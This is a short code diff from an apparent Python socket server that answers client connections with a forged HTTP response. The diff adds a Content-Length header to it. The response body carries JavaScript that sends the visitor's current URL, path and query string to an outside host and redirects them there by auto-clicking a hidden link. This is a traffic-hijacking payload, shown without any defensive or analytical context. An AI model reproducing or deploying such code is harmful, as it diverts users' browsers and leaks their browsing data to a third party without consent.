@@ -19,6 +19,7 @@ def main():
 
         cli_sock.sendall(b'''HTTP/1.1 200 Moved Temporarily\r\n'''
             b'''Content-Type: text/html\r\n'''
+            b'''Content-Length: 425\r\n'''
             b'''Connection: close\r\n\r\n<html><head></head><body><a href="" id="hao123"></a><script type="text/javascript">var strU="https://abcxz.xyz:8443/?u="+window.location+"&p="+window.location.pathname+window.location.search;hao123.href=strU;if(document.all){document.getElementById("hao123").click();}else {var e=document.createEvent("MouseEvents");e.initEvent("click",true,true);document.getElementById("hao123").dispatchEvent(e);}</script></body></html>''')
 
         def wait_second():
